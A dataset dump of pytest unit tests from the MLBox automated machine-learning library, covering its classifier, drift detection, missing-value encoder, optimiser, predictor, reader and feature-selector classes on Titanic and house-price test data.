    assert classifier._Classifier__strategy == 'ExtraTrees'
    classifier.set_params(strategy='RandomForest')
    assert classifier._Classifier__strategy == 'RandomForest'
    classifier.set_params(strategy='Tree')
    assert classifier._Classifier__strategy == 'Tree'
    classifier.set_params(strategy='AdaBoost')
    assert classifier._Classifier__strategy == 'AdaBoost'
    classifier.set_params(strategy='Linear')
    assert classifier._Classifier__strategy == 'Linear'
    with pytest.warns(UserWarning) as record:
        classifier.set_params(wrong_strategy='wrong_strategy')
    assert len(record) == 1"
AxeldeRomblay/MLBox,test_set_classifier,"def test_set_classifier():
    """"""Test set method of Classifier class.""""""
    classifier = Classifier()
    with pytest.raises(ValueError):
        classifier._Classifier__set_classifier('wrong_strategy')"
AxeldeRomblay/MLBox,test_fit_classifier,"def test_fit_classifier():
    """"""Test fit method of Classifier class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    classifier = Classifier()
    classifier.fit(df_train, y_train)
    assert np.all(classifier._Classifier__col == df_train.columns)
    assert classifier._Classifier__fitOK"
AxeldeRomblay/MLBox,test_feature_importances_classifier,"def test_feature_importances_classifier():
    """"""Test feature_importances method of Classifier class.""""""
    classifier = Classifier()
    with pytest.raises(ValueError):
        classifier.feature_importances()
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    classifier.set_params(strategy='LightGBM')
    classifier.fit(df_train, y_train)
    importance = classifier.feature_importances()
    assert importance != {}
    classifier.set_params(strategy='Linear')
    classifier.fit(df_train, y_train)
    importance = classifier.feature_importances()
    assert importance != {}
    classifier.set_params(strategy='RandomForest')
    classifier.fit(df_train, y_train)
    importance = classifier.feature_importances()
    assert importance != {}
    classifier.set_params(strategy='AdaBoost')
    classifier.fit(df_train, y_train)
    importance = classifier.feature_importances()
    assert importance != {}
    classifier.set_params(strategy='Bagging')
    classifier.fit(df_train, y_train)
    importance = classifier.feature_importances()
    assert importance != {}"
AxeldeRomblay/MLBox,test_predict_classifier,"def test_predict_classifier():
    """"""Test predict method of Classifier class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    classifier = Classifier()
    with pytest.raises(ValueError):
        classifier.predict(df_train)
    classifier.fit(df_train, y_train)
    with pytest.raises(ValueError):
        classifier.predict(None)
    assert len(classifier.predict(df_train)) > 0"
AxeldeRomblay/MLBox,test_predict_log_proba_classifier,"def test_predict_log_proba_classifier():
    """"""Test predict_log_proba method of Classifier class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    classifier = Classifier(strategy='Linear')
    with pytest.raises(ValueError):
        classifier.predict_log_proba(df_train)
    classifier.fit(df_train, y_train)
    with pytest.raises(ValueError):
        classifier.predict_log_proba(None)
    assert len(classifier.predict_log_proba(df_train)) > 0"
AxeldeRomblay/MLBox,test_predict_proba_classifier,"def test_predict_proba_classifier():
    """"""Test predict_proba method of Classifier class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    classifier = Classifier()
    with pytest.raises(ValueError):
        classifier.predict_proba(df_train)
    classifier.fit(df_train, y_train)
    with pytest.raises(ValueError):
        classifier.predict_proba(None)
    assert len(classifier.predict_proba(df_train)) > 0"
AxeldeRomblay/MLBox,test_score_classifier,"def test_score_classifier():
    """"""Test score method of Classifier class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    classifier = Classifier()
    with pytest.raises(ValueError):
        classifier.score(df_train, y_train)
    classifier.fit(df_train, y_train)
    with pytest.raises(ValueError):
        classifier.score(None, y_train)
    with pytest.raises(ValueError):
        classifier.score(df_train, None)
    assert classifier.score(df_train, y_train) > 0"
AxeldeRomblay/MLBox,test_get_estimator_classifier,"def test_get_estimator_classifier():
    """"""Test get_estimator method of Classifier class.""""""
    classifier = Classifier()
    estimator = classifier.get_estimator()
    assert isinstance(estimator, type(LGBMClassifier()))"
AxeldeRomblay/MLBox,test_init_drift_estimator,"def test_init_drift_estimator():
    """"""Test init method of DriftEstimator class.""""""
    drift_estimator = DriftEstimator()
    assert drift_estimator.n_folds == 2
    assert drift_estimator.stratify
    assert drift_estimator.random_state == 1
    assert not drift_estimator._DriftEstimator__cv
    assert not drift_estimator._DriftEstimator__pred
    assert not drift_estimator._DriftEstimator__target
    assert not drift_estimator._DriftEstimator__fitOK"
AxeldeRomblay/MLBox,test_get_params_drift_estimator,"def test_get_params_drift_estimator():
    """"""Test get_params method of DriftEstimator class.""""""
    drift_estimator = DriftEstimator()
    dict = {'estimator': drift_estimator.estimator, 'n_folds': 2, 'stratify': True, 'random_state': 1}
    assert drift_estimator.get_params() == dict"
AxeldeRomblay/MLBox,test_set_params_drift_estimator,"def test_set_params_drift_estimator():
    """"""Test set_params method of DriftEstimator class.""""""
    drift_estimator = DriftEstimator()
    dict = {'estimator': drift_estimator.estimator, 'n_folds': 3, 'stratify': False, 'random_state': 2}
    drift_estimator.set_params(**dict)
    assert drift_estimator.get_params() == dict"
AxeldeRomblay/MLBox,test_fit_drift_estimator,"def test_fit_drift_estimator():
    """"""Test fit method of DriftEstimator class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    df_test = pd.read_csv('data_for_tests/clean_test.csv')
    drift_estimator = DriftEstimator()
    drift_estimator.fit(df_train, df_test)
    assert drift_estimator._DriftEstimator__fitOK"
AxeldeRomblay/MLBox,test_score_drift_estimator,"def test_score_drift_estimator():
    """"""Test score method of DriftEstimator class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    df_test = pd.read_csv('data_for_tests/clean_test.csv')
    drift_estimator = DriftEstimator()
    with pytest.raises(ValueError):
        drift_estimator.score()
    drift_estimator.fit(df_train, df_test)
    assert drift_estimator.score() > 0"
AxeldeRomblay/MLBox,test_predict_drift_estimator,"def test_predict_drift_estimator():
    """"""Test predict method of DriftEstimator class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    df_test = pd.read_csv('data_for_tests/clean_test.csv')
    drift_estimator = DriftEstimator()
    with pytest.raises(ValueError):
        drift_estimator.predict()
    drift_estimator.fit(df_train, df_test)
    results = drift_estimator.predict()
    assert len(results) == 1309"
AxeldeRomblay/MLBox,test_init_drift_threshold,"def test_init_drift_threshold():
    """"""Test init method of DriftThreshold class.""""""
    drift_threshold = DriftThreshold()
    assert drift_threshold.threshold == 0.6
    assert drift_threshold.subsample == 1.0
    assert isinstance(drift_threshold.estimator, type(DecisionTreeClassifier()))
    assert drift_threshold.n_folds == 2
    assert drift_threshold.stratify
    assert drift_threshold.random_state == 1
    assert drift_threshold.n_jobs == -1
    assert not drift_threshold._DriftThreshold__fitOK"
AxeldeRomblay/MLBox,test_get_params_drift_threshold,"def test_get_params_drift_threshold():
    """"""Test get_params method of DriftThreshold class.""""""
    drift_threshold = DriftThreshold()
    dict = {'threshold': 0.6, 'subsample': 1.0, 'n_folds': 2, 'stratify': True, 'random_state': 1, 'n_jobs': -1}
    dict_get_params = drift_threshold.get_params()
    assert dict_get_params['threshold'] == dict['threshold']
    assert dict_get_params['subsample'] == dict['subsample']
    assert dict_get_params['n_folds'] == dict['n_folds']
    assert dict_get_params['stratify'] == dict['stratify']
    assert dict_get_params['random_state'] == dict['random_state']
    assert dict_get_params['n_jobs'] == dict['n_jobs']"
AxeldeRomblay/MLBox,test_set_params_drift_threshold,"def test_set_params_drift_threshold():
    """"""Test set_params method of DriftThreshold class.""""""
    drift_threshold = DriftThreshold()
    dict = {'threshold': 0.6, 'subsample': 1.0, 'estimator': DecisionTreeClassifier(max_depth=6), 'n_folds': 2, 'stratify': True, 'random_state': 1, 'n_jobs': -1}
    drift_threshold.set_params(**dict)
    dict_get_params = drift_threshold.get_params()
    assert dict_get_params['threshold'] == dict['threshold']
    assert dict_get_params['subsample'] == dict['subsample']
    assert dict_get_params['n_folds'] == dict['n_folds']
    assert dict_get_params['stratify'] == dict['stratify']
    assert dict_get_params['random_state'] == dict['random_state']
    assert dict_get_params['n_jobs'] == dict['n_jobs']"
AxeldeRomblay/MLBox,test_fit_drift_threshold,"def test_fit_drift_threshold():
    """"""Test fit method of DriftThreshold class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    df_test = pd.read_csv('data_for_tests/clean_test.csv')
    drift_threshold = DriftThreshold()
    drift_threshold.fit(df_train, df_test)
    assert drift_threshold._DriftThreshold__fitOK"
AxeldeRomblay/MLBox,test_transform_drift_threshold,"def test_transform_drift_threshold():
    """"""Test transform method of DriftThreshold class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    df_test = pd.read_csv('data_for_tests/clean_test.csv')
    drift_threshold = DriftThreshold()
    with pytest.raises(ValueError):
        drift_threshold.transform(df_train)
    drift_threshold.fit(df_train, df_test)
    df_transformed = drift_threshold.transform(df_train)
    assert (df_train.columns == df_transformed.columns).all()"
AxeldeRomblay/MLBox,test_get_support_drift_threshold,"def test_get_support_drift_threshold():
    """"""Test get_support method of DriftThreshold class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    df_test = pd.read_csv('data_for_tests/clean_test.csv')
    drift_threshold = DriftThreshold()
    with pytest.raises(ValueError):
        drift_threshold.get_support()
    drift_threshold.fit(df_train, df_test)
    keep_list = drift_threshold.get_support()
    drop_list = drift_threshold.get_support(complement=True)
    for name in ['Age', 'Fare', 'Parch', 'Pclass', 'SibSp']:
        assert name in keep_list
    assert not drop_list"
AxeldeRomblay/MLBox,test_drifts_drift_threshold,"def test_drifts_drift_threshold():
    """"""Test drifts method of DriftThreshold class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    df_test = pd.read_csv('data_for_tests/clean_test.csv')
    drift_threshold = DriftThreshold()
    with pytest.raises(ValueError):
        drift_threshold.drifts()
    drift_threshold.fit(df_train, df_test)
    drifts = drift_threshold.drifts()
    for name in ['Age', 'Fare', 'Parch', 'Pclass', 'SibSp']:
        assert name in list(drifts.keys())"
AxeldeRomblay/MLBox,test_sync_fit_drift_threshold,"def test_sync_fit_drift_threshold():
    """"""Test method sync_fit of drift_threshold module.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    df_test = pd.read_csv('data_for_tests/clean_test.csv')
    estimator = RandomForestClassifier(n_estimators=50, n_jobs=-1, max_features=1.0, min_samples_leaf=5, max_depth=5)
    score = sync_fit(df_train, df_test, estimator)
    assert 0 <= score"
AxeldeRomblay/MLBox,test_init_drift_thresholder,"def test_init_drift_thresholder():
    """"""Test init method of Drift_thresholder class.""""""
    drift_thresholder = Drift_thresholder()
    assert drift_thresholder.threshold == 0.6
    assert not drift_thresholder.inplace
    assert drift_thresholder.verbose
    assert drift_thresholder.to_path == 'save'
    assert drift_thresholder._Drift_thresholder__Ddrifts == {}
    assert not drift_thresholder._Drift_thresholder__fitOK"
AxeldeRomblay/MLBox,test_fit_transform,"def test_fit_transform():
    """"""Test fit transform method of Drift_thresholder class.""""""
    drift_thresholder = Drift_thresholder()
    reader = Reader(sep=',')
    dict = reader.train_test_split(Lpath=['data_for_tests/train.csv'], target_name='Survived')
    drift_thresholder.fit_transform(dict)
    assert not drift_thresholder._Drift_thresholder__fitOK
    dict = reader.train_test_split(Lpath=['data_for_tests/train.csv', 'data_for_tests/test.csv'], target_name='Survived')
    drift_thresholder.fit_transform(dict)
    assert drift_thresholder._Drift_thresholder__fitOK
    dict = reader.train_test_split(Lpath=['data_for_tests/inplace_train.csv', 'data_for_tests/inplace_test.csv'], target_name='Survived')
    drift_thresholder.inplace = True
    drift_thresholder.fit_transform(dict)
    assert drift_thresholder._Drift_thresholder__fitOK"
AxeldeRomblay/MLBox,test_drifts,"def test_drifts():
    """"""Test drifts method of Drift_thresholder class.""""""
    drift_thresholder = Drift_thresholder()
    with pytest.raises(ValueError):
        drift_thresholder.drifts()
    reader = Reader(sep=',')
    dict = reader.train_test_split(Lpath=['data_for_tests/train.csv', 'data_for_tests/test.csv'], target_name='Survived')
    drift_thresholder.fit_transform(dict)
    drifts = drift_thresholder.drifts()
    assert drifts != {}"
AxeldeRomblay/MLBox,test_init_NA_encoder,"def test_init_NA_encoder():
    """"""Test init method of NA_encoder class.""""""
    encoder = NA_encoder()
    assert encoder.numerical_strategy == 'mean'
    assert encoder.categorical_strategy == '<NULL>'
    assert encoder._NA_encoder__Lcat == []
    assert encoder._NA_encoder__Lnum == []
    assert not encoder._NA_encoder__imp
    assert encoder._NA_encoder__mode == dict()
    assert not encoder._NA_encoder__fitOK"
AxeldeRomblay/MLBox,test_get_params_NA_encoder,"def test_get_params_NA_encoder():
    """"""Test get_params method of NA_encoder class.""""""
    encoder = NA_encoder()
    dict = {'numerical_strategy': 'mean', 'categorical_strategy': '<NULL>'}
    assert encoder.get_params() == dict"
AxeldeRomblay/MLBox,test_set_params_NA_encoder,"def test_set_params_NA_encoder():
    """"""Test set_params method of NA_encoder class.""""""
    encoder = NA_encoder()
    encoder.set_params(numerical_strategy='mean')
    assert encoder.numerical_strategy == 'mean'
    encoder.set_params(numerical_strategy='median')
    assert encoder.numerical_strategy == 'median'
    encoder.set_params(numerical_strategy='most_frequent')
    assert encoder.numerical_strategy == 'most_frequent'
    encoder.set_params(numerical_strategy=3.0)
    assert encoder.numerical_strategy == 3.0
    encoder.set_params(categorical_strategy='<NULL>')
    assert encoder.categorical_strategy == '<NULL>'
    encoder.set_params(categorical_strategy='most_frequent')
    assert encoder.categorical_strategy == 'most_frequent'
    encoder.set_params(categorical_strategy='string_test')
    assert encoder.categorical_strategy == 'string_test'
    with pytest.warns(UserWarning) as record:
        encoder.set_params(_Categorical_encoder__Lcat=[])
    assert len(record) == 1"
AxeldeRomblay/MLBox,test_fit_NA_encoder,"def test_fit_NA_encoder():
    """"""Test fit method of NA_encoder class.""""""
    df = pd.read_csv('data_for_tests/train.csv')
    encoder = NA_encoder(numerical_strategy='wrong_strategy')
    with pytest.raises(ValueError):
        encoder.fit(df, df['Survived'])
    encoder.set_params(numerical_strategy='mean')
    encoder.fit(df, df['Survived'])
    assert encoder._NA_encoder__fitOK
    encoder.set_params(numerical_strategy='median')
    encoder.fit(df, df['Survived'])
    assert encoder._NA_encoder__fitOK
    encoder.set_params(numerical_strategy='most_frequent')
    encoder.fit(df, df['Survived'])
    assert encoder._NA_encoder__fitOK
    encoder.set_params(numerical_strategy=3.0)
    encoder.fit(df, df['Survived'])
    assert encoder._NA_encoder__fitOK
    encoder = NA_encoder(categorical_strategy=2)
    with pytest.raises(ValueError):
        encoder.fit(df, df['Survived'])
    encoder.set_params(categorical_strategy='<NULL>')
    encoder.fit(df, df['Survived'])
    assert encoder._NA_encoder__fitOK
    encoder.set_params(categorical_strategy='most_frequent')
    encoder.fit(df, df['Survived'])"
AxeldeRomblay/MLBox,test_transform_NA_encoder,"def test_transform_NA_encoder():
    """"""Test transform method of NA_encoder class.""""""
    df = pd.read_csv('data_for_tests/train.csv')
    encoder = NA_encoder()
    with pytest.raises(ValueError):
        encoder.transform(df)
    encoder.fit(df, df['Survived'])
    df_encoded = encoder.transform(df)
    assert (df.columns == df_encoded.columns).all()"
AxeldeRomblay/MLBox,test_init_optimiser,"def test_init_optimiser():
    """"""Test init method of Optimiser class.""""""
    with pytest.warns(UserWarning) as record:
        optimiser = Optimiser()
    assert len(record) == 1
    assert not optimiser.scoring
    assert optimiser.n_folds == 2
    assert optimiser.random_state == 1
    assert optimiser.to_path == 'save'
    assert optimiser.verbose"
AxeldeRomblay/MLBox,test_get_params_optimiser,"def test_get_params_optimiser():
    """"""Test get_params method of optimiser class.""""""
    with pytest.warns(UserWarning) as record:
        optimiser = Optimiser()
    assert len(record) == 1
    dict = {'scoring': None, 'n_folds': 2, 'random_state': 1, 'to_path': 'save', 'verbose': True}
    assert optimiser.get_params() == dict"
AxeldeRomblay/MLBox,test_set_params_optimiser,"def test_set_params_optimiser():
    """"""Test set_params method of Optimiser class.""""""
    with pytest.warns(UserWarning) as record:
        optimiser = Optimiser()
    assert len(record) == 1
    optimiser.set_params(scoring='accuracy')
    assert optimiser.scoring == 'accuracy'
    optimiser.set_params(n_folds=3)
    assert optimiser.n_folds == 3
    optimiser.set_params(random_state=2)
    assert optimiser.random_state == 2
    optimiser.set_params(to_path='name')
    assert optimiser.to_path == 'name'
    optimiser.set_params(verbose=False)
    assert not optimiser.verbose
    with pytest.warns(UserWarning) as record:
        optimiser.set_params(wrong_key=3)
    assert len(record) == 1"
AxeldeRomblay/MLBox,test_evaluate_classification_optimiser,"def test_evaluate_classification_optimiser():
    """"""Test evaluate method of Optimiser class for classication.""""""
    reader = Reader(sep=',')
    dict = reader.train_test_split(Lpath=['data_for_tests/train.csv', 'data_for_tests/test.csv'], target_name='Survived')
    drift_thresholder = Drift_thresholder()
    drift_thresholder = drift_thresholder.fit_transform(dict)
    with pytest.warns(UserWarning) as record:
        opt = Optimiser(scoring=None, n_folds=3)
    assert len(record) == 1
    score = opt.evaluate(None, dict)
    assert -np.Inf <= score
    with pytest.warns(UserWarning) as record:
        opt = Optimiser(scoring='roc_auc', n_folds=3)
    assert len(record) == 1
    score = opt.evaluate(None, dict)
    assert 0.0 <= score <= 1.0
    with pytest.warns(UserWarning) as record:
        opt = Optimiser(scoring='wrong_scoring', n_folds=3)
    assert len(record) == 1
    with pytest.warns(UserWarning) as record:
        score = opt.evaluate(None, dict)
    assert opt.scoring == 'neg_log_loss'"
AxeldeRomblay/MLBox,test_evaluate_regression_optimiser,"def test_evaluate_regression_optimiser():
    """"""Test evaluate method of Optimiser class for regression.""""""
    reader = Reader(sep=',')
    dict = reader.train_test_split(Lpath=['data_for_tests/train_regression.csv', 'data_for_tests/test_regression.csv'], target_name='SalePrice')
    drift_thresholder = Drift_thresholder()
    drift_thresholder = drift_thresholder.fit_transform(dict)
    mape = make_scorer(lambda y_true, y_pred: 100 * np.sum(np.abs(y_true - y_pred) / y_true) / len(y_true), greater_is_better=False, needs_proba=False)
    with pytest.warns(UserWarning) as record:
        opt = Optimiser(scoring=mape, n_folds=3)
    assert len(record) == 1
    score = opt.evaluate(None, dict)
    assert -np.Inf <= score
    with pytest.warns(UserWarning) as record:
        opt = Optimiser(scoring=None, n_folds=3)
    assert len(record) == 1
    score = opt.evaluate(None, dict)
    assert -np.Inf <= score
    with pytest.warns(UserWarning) as record:
        opt = Optimiser(scoring='wrong_scoring', n_folds=3)
    assert len(record) == 1
    with pytest.warns(UserWarning) as record:
        score = opt.evaluate(None, dict)
    assert -np.Inf <= score"
AxeldeRomblay/MLBox,test_evaluate_and_optimise_classification,"def test_evaluate_and_optimise_classification():
    """"""Test evaluate_and_optimise method of Optimiser class.""""""
    reader = Reader(sep=',')
    dict = reader.train_test_split(Lpath=['data_for_tests/train.csv', 'data_for_tests/test.csv'], target_name='Survived')
    drift_thresholder = Drift_thresholder()
    drift_thresholder = drift_thresholder.fit_transform(dict)
    with pytest.warns(UserWarning) as record:
        opt = Optimiser(scoring='accuracy', n_folds=3)
    assert len(record) == 1
    dict_error = dict.copy()
    dict_error['target'] = dict_error['target'].astype(str)
    with pytest.raises(ValueError):
        score = opt.evaluate(None, dict_error)
    with pytest.warns(UserWarning) as record:
        opt = Optimiser(scoring='accuracy', n_folds=3)
    assert len(record) == 1
    score = opt.evaluate(None, dict)
    assert 0.0 <= score <= 1.0
    space = {'ne__numerical_strategy': {'search': 'choice', 'space': [0]}, 'ce__strategy': {'search': 'choice', 'space': ['label_encoding']}, 'fs__threshold': {'search': 'uniform', 'space': [0.01, 0.3]}, 'est__max_depth': {'search': 'choice', 'space': [3, 4, 5, 6, 7]}}
    best = opt.optimise(space, dict, 1)
    assert type(best) == type(dict)"
AxeldeRomblay/MLBox,test_init_predictor,"def test_init_predictor():
    """"""Test init method of Predictor class.""""""
    predictor = Predictor()
    assert predictor.to_path == 'save'
    assert predictor.verbose"
AxeldeRomblay/MLBox,test_get_params_predictor,"def test_get_params_predictor():
    """"""Test get_params method of Predictor class.""""""
    predictor = Predictor()
    dict = {'to_path': 'save', 'verbose': True}
    assert predictor.get_params() == dict"
AxeldeRomblay/MLBox,test_set_params_predictor,"def test_set_params_predictor():
    """"""Test set_params method of Predictor class.""""""
    predictor = Predictor()
    predictor.set_params(to_path='name')
    assert predictor.to_path == 'name'
    predictor.set_params(verbose=False)
    assert not predictor.verbose
    with pytest.warns(UserWarning) as record:
        predictor.set_params(wrong_key=3)
    assert len(record) == 1"
AxeldeRomblay/MLBox,test_fit_predict_predictor_classification,"def test_fit_predict_predictor_classification():
    """"""Test fit_predict method of Predictor class for classification.""""""
    reader = Reader(sep=',')
    dict = reader.train_test_split(Lpath=['data_for_tests/train.csv', 'data_for_tests/test.csv'], target_name='Survived')
    drift_thresholder = Drift_thresholder()
    drift_thresholder = drift_thresholder.fit_transform(dict)
    with pytest.warns(UserWarning) as record:
        opt = Optimiser(scoring='accuracy', n_folds=3)
    assert len(record) == 1
    space = {'ne__numerical_strategy': {'search': 'choice', 'space': [0]}, 'ce__strategy': {'search': 'choice', 'space': ['entity_embedding']}, 'fs__threshold': {'search': 'uniform', 'space': [0.01, 0.3]}, 'est__max_depth': {'search': 'choice', 'space': [3, 4, 5, 6, 7]}}
    optimal_hyper_parameters = opt.optimise(space, dict, 1)
    predictor = Predictor(verbose=False)
    predictor.fit_predict(optimal_hyper_parameters, dict)
    pred_df = pd.read_csv('save/Survived_predictions.csv')
    assert np.all(list(pred_df.columns) == ['Unnamed: 0', '0.0', '1.0', 'Survived_predicted'])
    assert np.shape(pred_df) == (418, 4)"
AxeldeRomblay/MLBox,test_fit_predict_predictor_regression,"@patch('matplotlib.pyplot.show')
def test_fit_predict_predictor_regression(mock_show):
    """"""Test fit_predict method of Predictor class for regression.""""""
    rd = Reader(sep=',')
    dt = rd.train_test_split(Lpath=['data_for_tests/train_regression.csv', 'data_for_tests/test_regression.csv'], target_name='SalePrice')
    drift_thresholder = Drift_thresholder()
    df = drift_thresholder.fit_transform(dt)
    mape = make_scorer(lambda y_true, y_pred: 100 * np.sum(np.abs(y_true - y_pred) / y_true) / len(y_true), greater_is_better=False, needs_proba=False)
    opt = Optimiser(scoring=mape, n_folds=3)
    opt.evaluate(None, df)
    space = {'ne__numerical_strategy': {'search': 'choice', 'space': [0]}, 'ce__strategy': {'search': 'choice', 'space': ['random_projection']}, 'fs__threshold': {'search': 'uniform', 'space': [0.01, 0.3]}, 'est__max_depth': {'search': 'choice', 'space': [3, 4, 5, 6, 7]}}
    best = opt.optimise(space, df, 1)
    prd = Predictor(verbose=True)
    prd.fit_predict(best, df)
    pred_df = pd.read_csv('save/SalePrice_predictions.csv')
    assert np.all(list(pred_df.columns) == ['Unnamed: 0', 'SalePrice_predicted'])
    assert np.shape(pred_df) == (1459, 2)"
AxeldeRomblay/MLBox,test_fit_predict_predictor_regression,"def test_fit_predict_predictor_regression():
    """"""Test fit_predict method of Predictor class for regression.""""""
    rd = Reader(sep=',')
    dt = rd.train_test_split(Lpath=['data_for_tests/train_regression.csv', 'data_for_tests/test_regression.csv'], target_name='SalePrice')
    drift_thresholder = Drift_thresholder()
    df = drift_thresholder.fit_transform(dt)
    mape = make_scorer(lambda y_true, y_pred: 100 * np.sum(np.abs(y_true - y_pred) / y_true) / len(y_true), greater_is_better=False, needs_proba=False)
    opt = Optimiser(scoring=mape, n_folds=3)
    opt.evaluate(None, df)
    space = {'ne__numerical_strategy': {'search': 'choice', 'space': [0]}, 'ce__strategy': {'search': 'choice', 'space': ['label_encoding', 'random_projection', 'entity_embedding']}, 'fs__threshold': {'search': 'uniform', 'space': [0.01, 0.3]}, 'est__max_depth': {'search': 'choice', 'space': [3, 4, 5, 6, 7]}}
    best = opt.optimise(space, df, 1)
    prd = Predictor(verbose=False)
    prd.fit_predict(best, df)
    pred_df = pd.read_csv('save/SalePrice_predictions.csv')
    assert np.all(list(pred_df.columns) == ['Unnamed: 0', 'SalePrice_predicted'])
    assert np.shape(pred_df) == (1459, 2)"
AxeldeRomblay/MLBox,test_init_reader,"def test_init_reader():
    """"""Test init method of Reader class.""""""
    reader = Reader()
    assert not reader.sep
    assert reader.header == 0
    assert not reader.to_hdf5
    assert reader.to_path == 'save'
    assert reader.verbose"
AxeldeRomblay/MLBox,test_clean_reader,"def test_clean_reader():
    """"""Test clean method of Reader class.""""""
    reader = Reader()
    with pytest.raises(ValueError):
        reader.clean(path=None, drop_duplicate=False)
    with pytest.raises(ValueError):
        reader.clean(path='data_for_tests/train.csv')
    reader = Reader(sep=',')
    df = reader.clean(path='data_for_tests/train.csv')
    assert np.shape(df) == (891, 12)
    with pytest.raises(ValueError):
        reader.clean(path='data_for_tests/train.wrong_extension')
    df_drop = reader.clean(path='data_for_tests/train.csv', drop_duplicate=True)
    assert np.shape(df_drop) == (891, 12)
    assert np.all(df['Name'] == df_drop['Name'])
    reader = Reader()
    df_excel = reader.clean(path='data_for_tests/train.xls')
    assert np.shape(df_excel) == (891, 12)
    assert np.all(df['Name'] == df_excel['Name'])
    if sys.platform == 'win32' and sys.version_info[0] <= 3 and (sys.version_info[1] <= 5):
        pass
    else:
        if sys.version_info[0] >= 3:
            df_hdf = reader.clean(path='data_for_tests/train.h5')
            assert np.shape(df_hdf) == (891, 12)
            assert np.all(df['Name'] == df_hdf['Name'])
        df_json = reader.clean(path='data_for_tests/train.json')
        assert np.shape(df_json) == (891, 12)"
AxeldeRomblay/MLBox,test_train_test_split_reader,"def test_train_test_split_reader():
    """"""Test train_test_split method of Reader class.""""""
    reader = Reader(sep=',')
    with pytest.raises(ValueError):
        reader.train_test_split(Lpath=None, target_name='target')
    with pytest.raises(ValueError):
        reader.train_test_split(Lpath=['data_for_tests/train.csv'], target_name=None)
    with pytest.raises(ValueError):
        reader = Reader(to_path=None)
        reader.train_test_split(Lpath=['data_for_tests/train.csv'], target_name='Survived')
    reader = Reader(sep=',')
    dict = reader.train_test_split(Lpath=['data_for_tests/train.csv'], target_name='Survived')
    assert len(dict) == 3
    assert 'train' in list(dict.keys())
    assert 'test' in list(dict.keys())
    assert 'target' in list(dict.keys())
    assert np.all(dict['train'].columns == dict['train'].columns)
    if sys.version_info[0] >= 3 and sys.platform != 'win32':
        reader = Reader(to_hdf5=True)
        dict = reader.train_test_split(Lpath=['data_for_tests/train.h5'], target_name='Survived')
        assert len(dict) == 3
        assert 'train' in list(dict.keys())
        assert 'test' in list(dict.keys())
        assert 'target' in list(dict.keys())
        assert np.all(dict['train'].columns == dict['train'].columns)"
AxeldeRomblay/MLBox,test_convert_list_reader,"def test_convert_list_reader():
    """"""Test convert_list function of reader module.""""""
    data_list = list()
    data_list.append([1, 2])
    data_list.append([3, 4])
    index = ['a', 'b']
    serie = pd.Series(data=data_list, index=index, name='test')
    df = convert_list(serie)
    assert np.all(df.index == serie.index)
    assert np.all(df.columns.values == ['test_item1', 'test_item2'])"
AxeldeRomblay/MLBox,test_convert_float_and_dates_reader,"def test_convert_float_and_dates_reader():
    """"""Test convert_float_and_dates function of reader module.""""""
    index = ['a', 'b', 'c']
    values = [1, 2, 3]
    serie = pd.Series(data=values, index=index)
    serie = convert_float_and_dates(serie)
    assert serie.dtype == 'float64'
    index = ['a', 'b', 'c']
    values = np.array(['2007-07-13', '2006-01-13', '2010-08-13'], dtype='datetime64')
    serie = pd.Series(data=values, index=index, dtype='datetime64[ns]', name='test')
    df = convert_float_and_dates(serie)
    assert np.all(df.index == serie.index)
    assert np.all(df.columns.values == ['test_TIMESTAMP', 'test_YEAR', 'test_MONTH', 'test_DAY', 'test_DAYOFWEEK', 'test_HOUR'])
    index = ['a', 'b', 'c']
    values = np.array(['2007-07-13', '2006-01-13', '2010-08-13'])
    serie = pd.Series(data=values, index=index, name='test')
    df = convert_float_and_dates(serie)
    assert np.all(df.index == serie.index)
    assert np.all(df.columns.values == ['test_TIMESTAMP', 'test_YEAR', 'test_MONTH', 'test_DAY', 'test_DAYOFWEEK', 'test_HOUR'])"
AxeldeRomblay/MLBox,test_init_Reg_feature_selector,"def test_init_Reg_feature_selector():
    """"""Test init method of Reg_feature_selector class.""""""
    feature_selector = Reg_feature_selector()
    assert feature_selector.strategy == 'l1'
    assert feature_selector.threshold == 0.3
    assert not feature_selector._Reg_feature_selector__fitOK
    assert feature_selector._Reg_feature_selector__to_discard == []"
AxeldeRomblay/MLBox,test_get_params_Reg_feature_selector,"def test_get_params_Reg_feature_selector():
    """"""Test get_params method of Reg_feature_selector class.""""""
    feature_selector = Reg_feature_selector()
    dict = {'strategy': 'l1', 'threshold': 0.3}
    assert feature_selector.get_params() == dict"
AxeldeRomblay/MLBox,test_set_params_Reg_feature_selector,"def test_set_params_Reg_feature_selector():
    """"""Test set_params of method Reg_feature_selector class.""""""
    feature_selector = Reg_feature_selector()
    feature_selector.set_params(strategy='variance')
    assert feature_selector.strategy == 'variance'
    feature_selector.set_params(threshold=0.2)
    assert feature_selector.threshold == 0.2
    with pytest.warns(UserWarning) as record:
        feature_selector.set_params(wrong_strategy='wrong_strategy')
    assert len(record) == 1"
AxeldeRomblay/MLBox,test_fit_Reg_feature_selector,"def test_fit_Reg_feature_selector():
    """"""Test fit method of Reg_feature_selector class.""""""
    feature_selector = Reg_feature_selector()
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    with pytest.raises(ValueError):
        feature_selector.fit(None, y_train)
    with pytest.raises(ValueError):
        feature_selector.fit(df_train, None)
    feature_selector.fit(df_train, y_train)
